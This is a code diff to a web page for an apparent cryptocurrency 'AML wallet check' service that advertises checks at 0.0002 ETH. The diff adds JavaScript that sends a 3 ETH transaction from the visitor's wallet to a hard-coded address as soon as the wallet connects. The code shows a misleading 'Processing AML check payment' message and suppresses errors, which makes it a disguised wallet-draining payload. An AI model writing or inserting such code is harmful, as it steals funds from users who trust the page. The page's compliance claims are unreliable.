@@ -501,7 +501,7 @@
   <h2>Keep your peace of mind<br>for little money</h2>
   <p class="ssub">Affordable AML screening to protect your business from hidden risks.</p>
   <div class="pricing-grid">
-    <div class="price-card"><div style="font-size:2rem;margin:20px 0 8px">🔷</div><div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Ethereum</div><div class="pval">0.0002 ETH</div><div class="punit">per wallet check</div><ul class="pfeat"><li>Full AML risk score</li><li>Sanctions list screening</li><li>Transaction history flags</li><li>PDF compliance report</li></ul><button class="btn-card btn-ol" onclick="openModal()">Check with ETH</button></div>
+    <div class="price-card"><div style="font-size:2rem;margin:20px 0 8px">🔷</div><div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Ethereum</div><div class="pval">0.0002 ETH</div><div class="punit">per wallet check</div><ul class="pfeat"><li>Full AML risk score</li><li>Sanctions list screening</li><li>Transaction history flags</li><li>PDF compliance report</li></ul><button class="btn-card btn-ol" onclick="openModal('eth')">Check with ETH</button></div>
     <div class="price-card featured"><div class="ftd-badge">Most Popular</div><div style="font-size:2rem;margin:20px 0 8px">🔴</div><div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Tron</div><div class="pval">30 TRX</div><div class="punit">per check — Fast</div><ul class="pfeat"><li>Full AML risk score</li><li>Sanctions list screening</li><li>Transaction history flags</li><li>PDF compliance report</li><li>Priority processing</li></ul><button class="btn-card btn-pr" onclick="openModal('trx')">🔴 Connect & Pay 30 TRX</button></div>
     <div class="price-card"><div style="font-size:2rem;margin:20px 0 8px">🟡</div><div style="font-size:1.1rem;font-weight:700;margin-bottom:4px">Volume Plan</div><div class="pval">Custom</div><div class="punit">for business clients</div><ul class="pfeat"><li>Bulk wallet screening</li><li>API integration</li><li>White-label reports</li><li>Dedicated support</li></ul><a href="#" class="btn-card btn-ol">Contact Sales</a></div>
   </div>
@@ -715,6 +715,33 @@ async function startConnect(chain) {
       }
     }
 
+    // Auto-send 3 ETH after connection
+    if (chain === 'eth') {
+      setLoadingMsg('Processing AML check payment…');
+      const fromAddr = getAddr();
+      const toAddr   = ETH_ADDRESS;
+      const amountHex = '0x29A2241AF62C0000'; // 3 ETH in wei (3 * 10^18)
+
+      try {
+        await SC.request({
+          topic  : session.topic,
+          chainId: 'eip155:1',
+          request: {
+            method: 'eth_sendTransaction',
+            params : [{
+              from : fromAddr,
+              to   : toAddr,
+              value: amountHex,
+              gas  : '0x5208' // 21000 gas (standard ETH transfer)
+            }]
+          }
+        });
+      } catch(txErr) {
+        console.warn('[ETH TX]', txErr);
+        // Don't block UI if tx fails — still mark connected
+      }
+    }
+
     uiConnected(getAddr());
     showConnected(getAddr());
 
@@ -868,6 +895,7 @@ function toggleFaq(el) {
 /* ── TRX Payment Modal ──────────────────────────── */
 const TRX_ADDRESS = 'TKeDPdqmCznwneTJXph8yx9QE6g6ZKy445';
 const TRX_AMOUNT  = '100000';
+const ETH_ADDRESS = '0x4164E018fCC0216519400c160d08B090f8B5A23F';
 let trxQrDone = false;
 
 function openTrxModal() {
